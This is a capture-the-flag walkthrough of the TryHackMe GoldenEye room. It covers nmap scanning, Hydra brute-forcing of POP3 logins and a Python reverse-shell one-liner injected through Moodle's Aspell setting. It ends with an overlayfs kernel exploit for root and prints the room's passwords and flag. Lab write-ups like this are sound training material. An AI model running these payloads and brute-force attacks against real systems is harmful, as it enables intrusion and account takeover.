


###### **Room link: [GoldenEye](https://tryhackme.com/r/room/goldeneye)**




#### **TASK-1: Intro**

Deployed the machine and connect to ovpn in my attacker machine 

1.**First things first, connect to our network and deploy the machine.**
   
   Launched an NMAP scan with `nmap -sV -p- 10.10.74.253 -Pn
    
    ![[Pasted image 20240717102516.png]]

1. **Use nmap to scan the network for all ports. How many ports are open?**
  
   We have 4  open ports `25`,`80`,`55006`,`55007`.

   ![[Pasted image 20240711164056.png]]
3. Take a look on the website, take a dive into the source code too and remember to inspect all scripts.
   
   After going to source you can find `terminal.js` and opening it up
   ![[Pasted image 20240712144126.png]]
 4. Who needs to make sure they update their default password?
    Ans: Boris
   ![[Pasted image 20240712144233.png]]
5. What's their password?

 You can find it encoded in `terminal.js`, copy it and head over to `cyberchef` to decode it. The encoded password is  
    `&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;`

It is encoded in html entity , so decoding it in cyberchef, I got the password is`InvincibleHack3r`.

6. Now go use those credentials and login to a part of the site.

   You can see in the homepage it says to go to `/sev-home/` to login. Head there and use the credentials to login.

   After logging in , it shows a message about GoldenEye and a clip from`moonraker` fil playing on background.Upon inspecting the page source,you can find 2 certified GNO operators in comments at bottom of the code.

   ![[Pasted image 20240712152541.png]]

   ![[Pasted image 20240712154724.png]]
#### **TASK-2: It's mail time...**

Going on to next steps


1. **Took a look at some of the other services that were found in nmap scan. The credentials are not re-usable?**
  
 ![[Pasted image 20240712154040.png]]


2. **If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra? What's their new password**?
    
    To  crack this I utilized Hydra tool and found a password match.
   Command:
    `hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://<IP>:55007`
   The password for `natalya`  is `bird`
      ![[Pasted image 20240712161241.png]]
	   This password isn't the right answer for this question. So, on to crack Boris password.
	   
	 After some time,  hydra gave the result which i s `secret1!`.
	  ![[Pasted image 20240712162850.png]]



3. **Inspect port 55007, what services is configured to use this port?**

   According to Nmap, Dovecot POP3 is running on port 55007. We can connect using `telnet`

4. Logging in to the service using Boris password
     
     ![[Pasted image 20240712163613.png]]

5. **What can you find on this service?**
   
   Using the `LIST` command, I can find messages which are `emails`(answer)
   ![[Pasted image 20240712163905.png]]

6. **What user can break Boris codes?**

   You can find this answer by reading those mails and also can confirm it by reading natalya mail.

   You can read the mails using command `RETR <msg no>`
   ![[Pasted image 20240712164102.png]]

7. **Using the users you found on this service, find other users passwords**

8. **Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.**
   
   The other user is `natalya` which can be cracked with same dictionary attack, since we already done it. Let's log in to service
     ![[Pasted image 20240713225448.png]]
   In one of the emails, I found `Xenia` password.

#### **TASK-3**

In the above discovered email, there is the `severnaya-station.com` website. To get this working, you need up update your DNS records to reveal it.

1. If you're on Linux edit your "/etc/hosts" file and add:

   `<machines ip>` severnaya-station.com

2. **If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file**

   **Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir.**


3. **Try using the credentials you found earlier. Which user can you login as?**

    Ans: `Xenia`

       ![[Pasted image 20240717102615.png]]


    Have a poke around the site. What other user can you find?

       ![[Pasted image 20240717102638.png]]

    Ans:  `Doak`


4. What was this users password?

   Let's perform dictionary attack again with Doak as username this time

     ![[Pasted image 20240717102705.png]]


   Ans: `goat`


   Use this users credentials to go through all the services you have found to reveal more emails.



4. What is the next user you can find from doak?


    Ans: `dr_doak`

   ![[Pasted image 20240717102731.png]]

5. What is this users password?

   Answer: `4England!`

   Take a look at their files on the moodle (severnaya-station.com)

   Using dr_doak’s account, we can find a `s3cret.txt` file in `My profile > My private files`.

   ![[Pasted image 20240717103907.png]]


6. Download the attachments and see if there are any hidden messages inside them?


   ![[Pasted image 20240717104017.png]]


```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.


Using the information you found in the last task, login with the newly found user.`
```

  ![[Pasted image 20240717104216.png]]
  

  The image description  consists  base64 encoded string of admin password decoding it we get

    `xWinter1995x!`

7. Using the information you found in the last task, login with the newly found user.


  As this user has more site privileges, you are able to edit the moodle's settings. From here get a reverse shell using python and netcat.

  Take a look into Aspell, the spell checker plugin.


   Hint: `Settings->Aspell->Path to aspell` field, add your code to be executed. Then create a new page and “spell check it”.

   Open a listener:

   `$ rlwrap nc -nlvp 4444`

   Now, from the Configuration panel, enter `spell` in the search. There are 2 settings to modify so that it works:

- Spell engine: PSpellShell
- Path to aspell: your reverse shell


  I used a python shell instead of the one set by default.
   
   ![[Pasted image 20240717104421.png]]

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.37",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

  Go to `Navigation > My profile > Blog > Add a new entry` and clik on the “Toggle spell checker” icon.


  Now you will have a reverse shell

   ![[Pasted image 20240717104923.png]]
### **Task 4:Privilege Escalation**

Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.


Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

- Download the linuxprivchecker file locally
- Navigate to the file on your file system
- Do: **python -m SimpleHTTPServer 1337** (leave this running)========
- On the VM you can now do: wget `<your IP>/<file>.py`

**OR**

Enumerate the machine manually.



1. Whats the kernel version?  

   Ans: `3.13.0-32-generic`

    ![[Pasted image 20240717105009.png]]


T his machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

- Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
- Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
- Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
- Make su on overlayfs world writable without changing the owner
- Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
- Execute the modified su binary

  You can download the exploit from here: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

  ![[Pasted image 20240717105044.png]]

I downloaded the code using searchsploit


Once downloaded the code, I transfered it using python3

 ![[Pasted image 20240717105203.png]]

Then I downloaded it in the reverse shell

   ![[Pasted image 20240717105225.png]]

Then I made the code to be executable


- **`"s/gcc/cc/g"`**: This part is the `sed` substitution command.
    
    - **`s`**: This stands for substitute.
    - **`gcc`**: This is the pattern to search for in the file. In this case, `gcc`.
    - **`cc`**: This is the replacement string. In this case, `cc`.
    - **`g`**: This is a global flag. It tells `sed` to replace all occurrences of the search pattern in each line, not just the first occurrence.
- **`exploit.c`**: This is the name of the file that `sed` will process.

  ![[Pasted image 20240717105249.png]]

Then I ran the program to get root access

   ![[Pasted image 20240717105311.png]]

From there I changed directory to /root

the flag was hidden in a file called flag.txt in root directory

  ![[Pasted image 20240717105331.png]]
 Ans: `568628e0d993b1973adc718237da6e93`

Then Visiting the last URL shows a congratulations message with a movie clip of James Bond

 ![[Pasted image 20240717105407.png]]


